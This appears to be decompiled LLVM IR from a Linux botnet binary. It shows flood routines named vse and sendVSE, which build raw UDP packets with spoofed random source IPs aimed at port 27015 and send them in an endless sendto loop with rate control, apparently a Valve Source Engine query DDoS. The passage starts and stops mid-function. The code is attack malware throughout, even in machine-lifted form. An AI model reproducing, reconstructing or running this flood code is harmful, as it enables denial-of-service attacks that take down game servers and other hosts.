  store i32 ptrtoint ([37 x i8]* @global_var_8069e28.94 to i32), i32* %v2_804aca7, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804acb2 = load i32, i32* @esp, align 4
  %v2_804acb2 = inttoptr i32 %v1_804acb2 to i32*
  store i32 %arg1, i32* %v2_804acb2, align 4
  %v2_804acb5 = call i32 @Send(i32 %storemerge4.lcssa, i32 128)
  store i32 %v2_804acb5, i32* %eax.global-to-local, align 4
  %v1_804ad53 = add i32 %arg4, 24
  %v1_804ad56 = inttoptr i32 %v1_804ad53 to i32*
  br label %dec_label_pc_804ad50

dec_label_pc_804acc6:                             ; preds = %dec_label_pc_804ad50
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v1_804acd5 = load i32, i32* @esp, align 4
  %v2_804acd5 = inttoptr i32 %v1_804acd5 to i32*
  store i32 50000, i32* %v2_804acd5, align 4
  %v1_804acd8 = sext i32 %storemerge to i64
  %v2_804acd8 = call i32 @usleep(i64 %v1_804acd8)
  %v0_804acdd = load i64, i64* @global_var_807e2e0.88, align 8
  %sext = mul i64 %v0_804acdd, 4294967296
  %v2_804ace6 = sdiv i64 %sext, 4294967296
  %v4_804ace6 = mul nsw i64 %v2_804ace6, 20
  %v5_804ace6 = trunc i64 %v4_804ace6 to i32
  store i32 %v5_804ace6, i32* %edx.global-to-local, align 4
  %tmp = icmp ugt i32 %v5_804ace6, %v2_804a99e
  %v0_804ad15 = load i32, i32* @global_var_807e1a8.89, align 8
  store i32 %v0_804ad15, i32* %eax.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_804acf0, label %dec_label_pc_804ad15

dec_label_pc_804acf0:                             ; preds = %dec_label_pc_804acc6
  %tmp47 = icmp slt i32 %v0_804ad15, 1
  %tmp48 = icmp eq i1 %tmp47, false
  br i1 %tmp48, label %dec_label_pc_804ad08, label %dec_label_pc_804acf9

dec_label_pc_804acf9:                             ; preds = %dec_label_pc_804acf0
  %v0_804acf9 = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804acfe = add i32 %v0_804acf9, 100
  store i32 %v1_804acfe, i32* %eax.global-to-local, align 4
  store i32 %v1_804acfe, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804ad43

dec_label_pc_804ad08:                             ; preds = %dec_label_pc_804acf0
  %v1_804ad0d = add i32 %v0_804ad15, -1
  store i32 %v1_804ad0d, i32* %eax.global-to-local, align 4
  store i32 %v1_804ad0d, i32* @global_var_807e1a8.89, align 8
  br label %dec_label_pc_804ad43

dec_label_pc_804ad15:                             ; preds = %dec_label_pc_804acc6
  %v1_804ad1a = add i32 %v0_804ad15, 1
  store i32 %v1_804ad1a, i32* @global_var_807e1a8.89, align 8
  %v0_804ad20 = load i32, i32* @global_var_8070d88.90, align 8
  store i32 %v0_804ad20, i32* %eax.global-to-local, align 4
  %v1_804ad25 = add i32 %v0_804ad20, -25
  %v5_804ad25 = icmp ult i32 %v0_804ad20, 25
  %v9_804ad25 = icmp eq i32 %v1_804ad25, 0
  %v2_804ad28 = or i1 %v5_804ad25, %v9_804ad25
  br i1 %v2_804ad28, label %dec_label_pc_804ad39, label %dec_label_pc_804ad2a

dec_label_pc_804ad2a:                             ; preds = %dec_label_pc_804ad15
  store i32 %v1_804ad25, i32* %eax.global-to-local, align 4
  store i32 %v1_804ad25, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804ad43

dec_label_pc_804ad39:                             ; preds = %dec_label_pc_804ad15
  store i32 0, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804ad43

dec_label_pc_804ad43:                             ; preds = %dec_label_pc_804ad2a, %dec_label_pc_804ad08, %dec_label_pc_804acf9, %dec_label_pc_804ad39
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v4_804ad4d = add i32 %storemerge, 1
  br label %dec_label_pc_804ad50

dec_label_pc_804ad50:                             ; preds = %dec_label_pc_804ac88, %dec_label_pc_804ad43
  %storemerge = phi i32 [ %v4_804ad4d, %dec_label_pc_804ad43 ], [ 0, %dec_label_pc_804ac88 ]
  store i32 %v1_804ad53, i32* %eax.global-to-local, align 4
  %v2_804ad56 = load i32, i32* %v1_804ad56, align 4
  store i32 %v2_804ad56, i32* %eax.global-to-local, align 4
  %v1_804ad58 = load i32, i32* @esp, align 4
  %v2_804ad58 = inttoptr i32 %v1_804ad58 to i32*
  store i32 %v2_804ad56, i32* %v2_804ad58, align 4
  %v1_804ad5b = call i32 @atol(i32 %storemerge)
  %v9_804ad60 = mul i32 %v1_804ad5b, 20
  store i32 %v9_804ad60, i32* %eax.global-to-local, align 4
  %v8_804ad67 = icmp sgt i32 %v9_804ad60, %storemerge
  br i1 %v8_804ad67, label %dec_label_pc_804acc6, label %dec_label_pc_804ad6d

dec_label_pc_804ad6d:                             ; preds = %dec_label_pc_804ad50, %dec_label_pc_804a88a, %entry
  %v0_804ad7a = phi i32 [ %v1_804a8b6, %dec_label_pc_804a88a ], [ %v2_804a820, %entry ], [ %v9_804ad60, %dec_label_pc_804ad50 ]
  ret i32 %v0_804ad7a

; uselistorder directives
  uselistorder i32 %v9_804ad60, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 2, 3, 1, 0 }
  uselistorder i32 %v1_804ad25, { 1, 0, 2 }
  uselistorder i32 %v0_804ad15, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804ad53, { 1, 0 }
  uselistorder i32 %v3_804abfb, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804abf6, { 0, 2, 1 }
  uselistorder i32 %storemerge456, { 3, 2, 0, 1 }
  uselistorder i32 %v2_804abc1, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v0_804aab7, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804aaa6, { 1, 0 }
  uselistorder i32 %v2_804aad1, { 1, 0, 2, 3, 4, 8, 9, 7, 6, 5, 10 }
  uselistorder i32 %v2_804a98b, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v0_804a97b, { 12, 10, 7, 6, 5, 4, 8, 1, 3, 2, 0, 9, 11 }
  uselistorder i32 %v4_804a8be, { 1, 0 }
  uselistorder i32 %v4_804a85e, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 0, 1, 3, 4, 2, 5, 13, 9, 10, 11, 12, 14, 16, 15, 65, 17, 18, 19, 22, 40, 20, 21, 23, 24, 25, 27, 28, 29, 30, 31, 26, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 67, 66 }
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ad50, { 1, 0 }
  uselistorder label %dec_label_pc_804ad43, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ab3c, { 1, 0 }
  uselistorder label %dec_label_pc_804a88a, { 1, 0 }
  uselistorder label %dec_label_pc_804a85e, { 1, 0 }
}

define i32 @sendVSE() local_unnamed_addr {
entry:
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %v2_804ad8b = ptrtoint i32* %stack_var_-4124 to i32
  %v1_804ad97 = add i32 %v2_804ad8b, 20
  store i32 2, i32* %stack_var_-4140, align 4
  store i32 17015, i32* %stack_var_-4188, align 4
  %v2_804adad = call i32 @htons(i16 17015)
  store i32 %tmp13, i32* %stack_var_-4188, align 4
  %v1_804adc2 = call i32 @inet_addr(i32 %tmp13)
  store i32 2, i32* %stack_var_-4188, align 4
  %v3_804ade4 = call i32 @socket(i32 2, i32 3, i32 17)
  %v5_804adec = icmp slt i32 %v3_804ade4, 0
  %v1_804adf0 = icmp eq i1 %v5_804adec, false
  br i1 %v1_804adf0, label %dec_label_pc_804adfe, label %dec_label_pc_804adf2

dec_label_pc_804adf2:                             ; preds = %entry
  store i32 -1, i32* %stack_var_-4188, align 4
  %v1_804adf9 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804adfe

dec_label_pc_804adfe:                             ; preds = %entry, %dec_label_pc_804adf2
  store i32 %v2_804ad8b, i32* %stack_var_-4188, align 4
  %v3_804ae1a = bitcast i32* %stack_var_-4124 to i8*
  %v4_804ae1a = call i32 @__GI_memset(i8* %v3_804ae1a, i32 0, i32 4096)
  store i32 %v2_804ad8b, i32* %stack_var_-4188, align 4
  %v2_804ae25 = call i32 @setup_ip_header(i8* %v3_804ae1a)
  store i32 %v1_804ad97, i32* @eax, align 4
  store i32 %v1_804ad97, i32* %stack_var_-4188, align 4
  %v1_804ae30 = call i32 @setup_udp_header(i32 %v1_804ad97)
  %v2_804ae3e = add i32 %v2_804ad8b, 16
  %v3_804ae3e = inttoptr i32 %v2_804ae3e to i32*
  store i32 %v1_804adc2, i32* %v3_804ae3e, align 4
  %v1_804ae44 = or i32 %v2_804ad8b, 2
  %v2_804ae44 = inttoptr i32 %v1_804ae44 to i16*
  %v3_804ae44 = load i16, i16* %v2_804ae44, align 2
  %v4_804ae44 = zext i16 %v3_804ae44 to i32
  store i32 %v2_804ad8b, i32* %stack_var_-4188, align 4
  %v2_804ae55 = bitcast i32* %stack_var_-4124 to i16*
  %v3_804ae55 = call i32 @csum(i16* %v2_804ae55, i32 %v4_804ae44)
  %v1_804ae60 = trunc i32 %v3_804ae55 to i16
  %v3_804ae60 = add i32 %v2_804ad8b, 10
  %v4_804ae60 = inttoptr i32 %v3_804ae60 to i16*
  store i16 %v1_804ae60, i16* %v4_804ae60, align 2
  store i32 1, i32* %stack_var_-4144, align 4
  %v2_804ae6e = ptrtoint i32* %stack_var_-4144 to i32
  store i32 %v3_804ade4, i32* %stack_var_-4188, align 4
  %v5_804ae9c = call i32 @__GI_setsockopt(i32 %v3_804ade4, i32 0, i32 3, i32 %v2_804ae6e, i32 4)
  %v2_804aea1 = icmp slt i32 %v5_804ae9c, 0
  %v1_804aea3 = icmp eq i1 %v2_804aea1, false
  br i1 %v1_804aea3, label %dec_label_pc_804aeb1, label %dec_label_pc_804aea5

dec_label_pc_804aea5:                             ; preds = %dec_label_pc_804adfe
  store i32 -1, i32* %stack_var_-4188, align 4
  %v1_804aeac = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804aeb1

dec_label_pc_804aeb1:                             ; preds = %dec_label_pc_804adfe, %dec_label_pc_804aea5
  store i32 0, i32* %stack_var_-4188, align 4
  %v2_804aeb8 = call i32 @__GI_time(i32* null)
  store i32 %v2_804aeb8, i32* %stack_var_-4188, align 4
  %v1_804aec0 = call i32 @init_rand(i32 %v2_804aeb8)
  %v2_804aec5 = ptrtoint i32* %stack_var_-4140 to i32
  %v2_804af46 = add i32 %v2_804ad8b, 12
  %v3_804af46 = inttoptr i32 %v2_804af46 to i32*
  %v3_804af5c = add i32 %v2_804ad8b, 4
  %v4_804af5c = inttoptr i32 %v3_804af5c to i16*
  br label %dec_label_pc_804aec5

dec_label_pc_804aec5:                             ; preds = %dec_label_pc_804aec5, %dec_label_pc_804aeb1
  %v3_804aece = load i16, i16* %v2_804ae44, align 2
  %v4_804aece = zext i16 %v3_804aece to i32
  store i32 %v3_804ade4, i32* %stack_var_-4188, align 4
  %v6_804aefa = call i32 @sendto(i32 %v3_804ade4, i32 %v2_804ad8b, i32 %v4_804aece, i32 0, i32 %v2_804aec5, i32 16)
  %v0_804aeff = load i32, i32* %stack_var_-4188, align 4
  %v1_804aeff = call i32 @rand_cmwc(i32 %v0_804aeff)
  %v2_804af04 = urem i32 %v1_804aeff, 16777216
  %v2_804af0e = sub i32 %v1_804aeff, %v2_804af04
  store i32 %v2_804af0e, i32* @ebx, align 4
  %v0_804af11 = load i32, i32* %stack_var_-4188, align 4
  %v1_804af11 = call i32 @rand_cmwc(i32 %v0_804af11)
  %sext = mul i32 %v1_804af11, 65536
  %v1_804af16 = sdiv i32 %sext, 65536
  %v1_804af19 = and i32 %v1_804af16, 16711680
  %v0_804af21 = load i32, i32* @ebx, align 4
  %v2_804af21 = or i32 %v1_804af19, %v0_804af21
  store i32 %v2_804af21, i32* @ebx, align 4
  %v0_804af23 = load i32, i32* %stack_var_-4188, align 4
  %v1_804af23 = call i32 @rand_cmwc(i32 %v0_804af23)
  %sext1 = mul i32 %v1_804af23, 16777216
  %v1_804af28 = sdiv i32 %sext1, 16777216
  %v1_804af2b = and i32 %v1_804af28, 65280
  %v0_804af33 = load i32, i32* @ebx, align 4
  %v2_804af33 = or i32 %v1_804af2b, %v0_804af33
  store i32 %v2_804af33, i32* @ebx, align 4
  %v0_804af35 = load i32, i32* %stack_var_-4188, align 4
  %v1_804af35 = call i32 @rand_cmwc(i32 %v0_804af35)
  %v1_804af3a = urem i32 %v1_804af35, 256
  %v0_804af3f = load i32, i32* @ebx, align 4
  %v2_804af41 = or i32 %v0_804af3f, %v1_804af3a
  store i32 %v2_804af41, i32* %v3_804af46, align 4
  %v0_804af49 = load i32, i32* %stack_var_-4188, align 4
  %v1_804af49 = call i32 @rand_cmwc(i32 %v0_804af49)
  store i32 %v1_804af49, i32* %stack_var_-4188, align 4
  %v1_804af51 = call i32 @htonl(i32 %v1_804af49)
  %v1_804af5c = trunc i32 %v1_804af51 to i16
  store i16 %v1_804af5c, i16* %v4_804af5c, align 4
  %v3_804af63 = load i16, i16* %v2_804ae44, align 2
  %v4_804af63 = zext i16 %v3_804af63 to i32
  store i32 %v2_804ad8b, i32* %stack_var_-4188, align 4
  %v3_804af74 = call i32 @csum(i16* %v2_804ae55, i32 %v4_804af63)
  %v1_804af7f = trunc i32 %v3_804af74 to i16
  store i16 %v1_804af7f, i16* %v4_804ae60, align 2
  br label %dec_label_pc_804aec5

; uselistorder directives
  uselistorder i32 %v3_804ade4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804ad97, { 2, 1, 0 }
  uselistorder i32 %v2_804ad8b, { 6, 7, 1, 2, 3, 8, 0, 4, 5, 9, 10 }
  uselistorder i32* %stack_var_-4188, { 5, 6, 3, 4, 2, 0, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-4144, { 1, 0 }
  uselistorder i32* %stack_var_-4140, { 1, 0 }
  uselistorder label %dec_label_pc_804aeb1, { 1, 0 }
  uselistorder label %dec_label_pc_804adfe, { 1, 0 }
}

define i32 @vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v1_804afa0 = call i32 @mfork(i32 %arg2)
  store i32 %v1_804afa0, i32* %eax.global-to-local, align 4
  %v1_804afa5 = icmp eq i32 %v1_804afa0, 0
  %v1_804afa7 = icmp eq i1 %v1_804afa5, false
  br i1 %v1_804afa7, label %dec_label_pc_804b30b, label %dec_label_pc_804afad

dec_label_pc_804afad:                             ; preds = %entry
  %v4_804afc4 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v4_804afc4, i32* %eax.global-to-local, align 4
  %v5_804afcc = icmp slt i32 %v4_804afc4, 0
  %v1_804afd0 = icmp eq i1 %v5_804afcc, false
  br i1 %v1_804afd0, label %dec_label_pc_804afde, label %dec_label_pc_804afd2

dec_label_pc_804afd2:                             ; preds = %dec_label_pc_804afad
  %v1_804afd9 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804afd9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804afde

dec_label_pc_804afde:                             ; preds = %dec_label_pc_804afad, %dec_label_pc_804afd2
  %v4_804afde = add i32 %arg3, -3
  %v9_804afde = sub i32 2, %arg3
  %v10_804afde = and i32 %v9_804afde, %arg3
  %v11_804afde = icmp slt i32 %v10_804afde, 0
  %v12_804afde = icmp eq i32 %v4_804afde, 0
  %v13_804afde = icmp slt i32 %v4_804afde, 0
  %v3_804afe2 = icmp eq i1 %v13_804afde, %v11_804afde
  %v4_804afe2 = icmp eq i1 %v12_804afde, false
  %v5_804afe2 = and i1 %v4_804afe2, %v3_804afe2
  br i1 %v5_804afe2, label %dec_label_pc_804b00a, label %dec_label_pc_804afe4

dec_label_pc_804afe4:                             ; preds = %dec_label_pc_804afde
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804aff9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([89 x i8]* @global_var_8069e50.95 to i32))
  store i32 %v3_804aff9, i32* %eax.global-to-local, align 4
  %v1_804b005 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804b005, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b00a

dec_label_pc_804b00a:                             ; preds = %dec_label_pc_804afde, %dec_label_pc_804afe4
  %v1_804b00d = add i32 %arg4, 12
  store i32 %v1_804b00d, i32* %eax.global-to-local, align 4
  %v1_804b010 = inttoptr i32 %v1_804b00d to i32*
  %v2_804b010 = load i32, i32* %v1_804b010, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804b01d = and i32 %v2_804b010, -256
  store i32 %v1_804b01d, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804b020 = inttoptr i32 %v2_804b010 to i8*
  store i32 %v2_804b010, i32* @edi, align 4
  %v3_804b026 = call i32 @_strlen(i8* %v4_804b020)
  %v4_804b026 = mul i32 %v3_804b026, -1
  %v5_804b026 = add i32 %v4_804b026, -2
  store i32 %v5_804b026, i32* %ecx.global-to-local, align 4
  %v1_804b02c = sub i32 0, %v4_804b026
  store i32 %v1_804b02c, i32* %edx.global-to-local, align 4
  %v2_804b034 = mul i32 %v3_804b026, 5
  %v1_804b036 = add i32 %v2_804b034, 160
  store i32 %v1_804b036, i32* %eax.global-to-local, align 4
  %v4_804b03e = add i32 %v2_804b034, -863
  %v9_804b03e = sub i32 862, %v2_804b034
  %v10_804b03e = and i32 %v9_804b03e, %v1_804b036
  %v11_804b03e = icmp slt i32 %v10_804b03e, 0
  %v12_804b03e = icmp eq i32 %v4_804b03e, 0
  %v13_804b03e = icmp slt i32 %v4_804b03e, 0
  %v3_804b045 = icmp eq i1 %v13_804b03e, %v11_804b03e
  %v4_804b045 = icmp eq i1 %v12_804b03e, false
  %v5_804b045 = and i1 %v4_804b045, %v3_804b045
  br i1 %v5_804b045, label %dec_label_pc_804b30b, label %dec_label_pc_804b04b

dec_label_pc_804b04b:                             ; preds = %dec_label_pc_804b00a
  %v2_804b052 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b052, i32* %eax.global-to-local, align 4
  %v1_804b05a = call i32 @srand(i32 %v2_804b052)
  store i32 0, i32* @global_var_807f300.80, align 256
  store i32 128, i32* %eax.global-to-local, align 4
  %v1_804b07d = call i32 @malloc(i32 128)
  store i32 %v1_804b07d, i32* @edx, align 4
  %v1_804b08b = inttoptr i32 %v1_804b07d to i8*
  store i32 %v1_804b07d, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804b092 = call i8* @_memset(i8* %v1_804b08b, i32 0, i32 128)
  %v6_804b092 = ptrtoint i8* %v5_804b092 to i32
  store i32 %v6_804b092, i32* %ecx.global-to-local, align 4
  %v1_804b09c = add i32 %arg4, 4
  store i32 %v1_804b09c, i32* %eax.global-to-local, align 4
  %v1_804b09f = inttoptr i32 %v1_804b09c to i32*
  %v2_804b09f = load i32, i32* %v1_804b09f, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v3_804b0ab = call i32 @host2ip(i32 %arg2, i32 %v2_804b09f)
  %v1_804b0b6 = add i32 %arg4, 8
  store i32 %v1_804b0b6, i32* %eax.global-to-local, align 4
  %v1_804b0b9 = inttoptr i32 %v1_804b0b6 to i32*
  %v2_804b0b9 = load i32, i32* %v1_804b0b9, align 4
  store i32 %v2_804b0b9, i32* %eax.global-to-local, align 4
  %v1_804b0be = call i32 @atol(i32 %v2_804b0b9)
  store i32 %v1_804b00d, i32* %eax.global-to-local, align 4
  %v2_804b0cc = load i32, i32* %v1_804b010, align 4
  store i32 %v2_804b0cc, i32* %eax.global-to-local, align 4
  %v1_804b0d1 = call i32 @atol(i32 %v2_804b0cc)
  %v1_804b0dc = add i32 %arg4, 16
  store i32 %v1_804b0dc, i32* %eax.global-to-local, align 4
  %v1_804b0df = inttoptr i32 %v1_804b0dc to i32*
  %v2_804b0df = load i32, i32* %v1_804b0df, align 4
  store i32 %v2_804b0df, i32* %eax.global-to-local, align 4
  %v1_804b0e4 = call i32 @atol(i32 %v2_804b0df)
  %v1_804b0ef = add i32 %arg4, 20
  store i32 %v1_804b0ef, i32* %eax.global-to-local, align 4
  %v1_804b0f2 = inttoptr i32 %v1_804b0ef to i32*
  %v2_804b0f2 = load i32, i32* %v1_804b0f2, align 4
  store i32 %v2_804b0f2, i32* %eax.global-to-local, align 4
  %v1_804b0f7 = call i32 @atol(i32 %v2_804b0f2)
  store i32 0, i32* @global_var_807e1a8.89, align 8
  store i64 0, i64* @global_var_807e2e0.88, align 32
  store i32 %v1_804b09c, i32* %eax.global-to-local, align 4
  %v2_804b132 = load i32, i32* %v1_804b09f, align 4
  store i32 %v2_804b132, i32* %eax.global-to-local, align 4
  %v1_804b137 = call i32 @inet_addr(i32 %v2_804b132)
  %v1_804b145 = mul i32 %v1_804b0d1, 4
  store i32 %v1_804b145, i32* %edx.global-to-local, align 4
  %v2_804b153 = mul i32 %v1_804b0d1, 28
  %v1_804b158 = add i32 %v2_804b153, 30
  %v2_804b15b = and i32 %v1_804b158, -16
  %v0_804b161 = load i32, i32* @esp, align 4
  %v2_804b161 = sub i32 %v0_804b161, %v2_804b15b
  %v1_804b173 = add i32 %v2_804b161, 35
  %v2_804b176 = and i32 %v1_804b173, -16
  store i32 %v2_804b176, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804b21443 = icmp sgt i32 %v1_804b0d1, 0
  br i1 %v5_804b21443, label %dec_label_pc_804b194.lr.ph, label %dec_label_pc_804b21a

dec_label_pc_804b194.lr.ph:                       ; preds = %dec_label_pc_804b04b
  %v3_804b1c8 = or i32 %v2_804b176, 8
  br label %dec_label_pc_804b194

dec_label_pc_804b194:                             ; preds = %dec_label_pc_804b194, %dec_label_pc_804b194.lr.ph
  %storemerge344 = phi i32 [ 0, %dec_label_pc_804b194.lr.ph ], [ %v4_804b20b, %dec_label_pc_804b194 ]
  %v1_804b19a = mul i32 %storemerge344, 4
  %v2_804b1a8 = mul i32 %storemerge344, 28
  %v3_804b1ad = add i32 %v2_804b1a8, %v2_804b176
  %v4_804b1ad = inttoptr i32 %v3_804b1ad to i32*
  store i32 %storemerge344, i32* %v4_804b1ad, align 4
  store i32 %v2_804b176, i32* %ecx.global-to-local, align 4
  store i32 %v2_804b1a8, i32* %edx.global-to-local, align 4
  %v4_804b1c8 = add i32 %v3_804b1c8, %v2_804b1a8
  %v5_804b1c8 = inttoptr i32 %v4_804b1c8 to i32*
  store i32 2, i32* %v5_804b1c8, align 4
  %v1_804b1d2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b1d2 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804b1d2 = add i32 %v1_804b1d2, 12
  %v4_804b1d2 = add i32 %v3_804b1d2, %v2_804b1d2
  %v5_804b1d2 = inttoptr i32 %v4_804b1d2 to i32*
  store i32 %v1_804b137, i32* %v5_804b1d2, align 4
  %v1_804b1dc = load i32, i32* %edx.global-to-local, align 4
  %v2_804b1dc = load i32, i32* %ecx.global-to-local, align 4
  %v3_804b1dc = add i32 %v1_804b1dc, 16
  %v4_804b1dc = add i32 %v3_804b1dc, %v2_804b1dc
  %v5_804b1dc = inttoptr i32 %v4_804b1dc to i32*
  %v1_804b1e6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b1e6 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804b1e6 = add i32 %v1_804b1e6, 20
  %v4_804b1e6 = add i32 %v3_804b1e6, %v2_804b1e6
  %v5_804b1e6 = inttoptr i32 %v4_804b1e6 to i32*
  store i32 %v2_804b176, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b19a, i32* %edx.global-to-local, align 4
  store i32 %v3_804b1ad, i32* %eax.global-to-local, align 4
  %v1_804b203 = load i32, i32* @esp, align 4
  %v2_804b203 = inttoptr i32 %v1_804b203 to i32*
  store i32 %v3_804b1ad, i32* %v2_804b203, align 4
  %v0_804b206 = call i32 @sendVSE()
  %v4_804b20b = add nuw nsw i32 %storemerge344, 1
  store i32 %v4_804b20b, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804b20b, %v1_804b0d1
  br i1 %exitcond, label %dec_label_pc_804b20e.dec_label_pc_804b21a_crit_edge, label %dec_label_pc_804b194

dec_label_pc_804b20e.dec_label_pc_804b21a_crit_edge: ; preds = %dec_label_pc_804b194
  %v1_804b22a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b21a

dec_label_pc_804b21a:                             ; preds = %dec_label_pc_804b20e.dec_label_pc_804b21a_crit_edge, %dec_label_pc_804b04b
  %v1_804b22a = phi i32 [ %v1_804b22a.pre, %dec_label_pc_804b20e.dec_label_pc_804b21a_crit_edge ], [ %v2_804b161, %dec_label_pc_804b04b ]
  %storemerge3.lcssa = phi i32 [ %v1_804b0d1, %dec_label_pc_804b20e.dec_label_pc_804b21a_crit_edge ], [ 0, %dec_label_pc_804b04b ]
  store i32 %v1_804b0b6, i32* %eax.global-to-local, align 4
  %v2_804b220 = load i32, i32* %v1_804b0b9, align 4
  store i32 %v2_804b220, i32* %edx.global-to-local, align 4
  store i32 %v1_804b09c, i32* %eax.global-to-local, align 4
  %v2_804b228 = load i32, i32* %v1_804b09f, align 4
  store i32 %v2_804b228, i32* %eax.global-to-local, align 4
  %v2_804b22a = add i32 %v1_804b22a, 16
  %v3_804b22a = inttoptr i32 %v2_804b22a to i32*
  store i32 %v2_804b220, i32* %v3_804b22a, align 4
  %v0_804b22e = load i32, i32* %eax.global-to-local, align 4
  %v1_804b22e = load i32, i32* @esp, align 4
  %v2_804b22e = add i32 %v1_804b22e, 12
  %v3_804b22e = inttoptr i32 %v2_804b22e to i32*
  store i32 %v0_804b22e, i32* %v3_804b22e, align 4
  %v1_804b235 = load i32, i32* @esp, align 4
  %v2_804b235 = add i32 %v1_804b235, 8
  %v3_804b235 = inttoptr i32 %v2_804b235 to i32*
  store i32 %arg2, i32* %v3_804b235, align 4
  %v0_804b239 = load i32, i32* @esp, align 4
  %v1_804b239 = add i32 %v0_804b239, 4
  %v2_804b239 = inttoptr i32 %v1_804b239 to i32*
  store i32 ptrtoint ([32 x i8]* @global_var_8069eac.96 to i32), i32* %v2_804b239, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804b244 = load i32, i32* @esp, align 4
  %v2_804b244 = inttoptr i32 %v1_804b244 to i32*
  store i32 %arg1, i32* %v2_804b244, align 4
  %v2_804b247 = call i32 @Send(i32 %storemerge3.lcssa, i32 128)
  store i32 %v2_804b247, i32* %eax.global-to-local, align 4
  %v1_804b2e5 = add i32 %arg4, 24
  %v1_804b2e8 = inttoptr i32 %v1_804b2e5 to i32*
  br label %dec_label_pc_804b2e2

dec_label_pc_804b258:                             ; preds = %dec_label_pc_804b2e2
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v1_804b267 = load i32, i32* @esp, align 4
  %v2_804b267 = inttoptr i32 %v1_804b267 to i32*
  store i32 50000, i32* %v2_804b267, align 4
  %v1_804b26a = sext i32 %storemerge to i64
  %v2_804b26a = call i32 @usleep(i64 %v1_804b26a)
  %v0_804b26f = load i64, i64* @global_var_807e2e0.88, align 8
  %sext = mul i64 %v0_804b26f, 4294967296
  %v2_804b278 = sdiv i64 %sext, 4294967296
  %v4_804b278 = mul nsw i64 %v2_804b278, 20
  %v5_804b278 = trunc i64 %v4_804b278 to i32
  store i32 %v5_804b278, i32* %edx.global-to-local, align 4
  %tmp = icmp ugt i32 %v5_804b278, %v1_804b0e4
  %v0_804b2a7 = load i32, i32* @global_var_807e1a8.89, align 8
  store i32 %v0_804b2a7, i32* %eax.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_804b282, label %dec_label_pc_804b2a7

dec_label_pc_804b282:                             ; preds = %dec_label_pc_804b258
  %tmp35 = icmp slt i32 %v0_804b2a7, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_804b29a, label %dec_label_pc_804b28b

dec_label_pc_804b28b:                             ; preds = %dec_label_pc_804b282
  %v0_804b28b = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804b290 = add i32 %v0_804b28b, 100
  store i32 %v1_804b290, i32* %eax.global-to-local, align 4
  store i32 %v1_804b290, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804b2d5

dec_label_pc_804b29a:                             ; preds = %dec_label_pc_804b282
  %v1_804b29f = add i32 %v0_804b2a7, -1
  store i32 %v1_804b29f, i32* %eax.global-to-local, align 4
  store i32 %v1_804b29f, i32* @global_var_807e1a8.89, align 8
  br label %dec_label_pc_804b2d5

dec_label_pc_804b2a7:                             ; preds = %dec_label_pc_804b258
  %v1_804b2ac = add i32 %v0_804b2a7, 1
  store i32 %v1_804b2ac, i32* @global_var_807e1a8.89, align 8
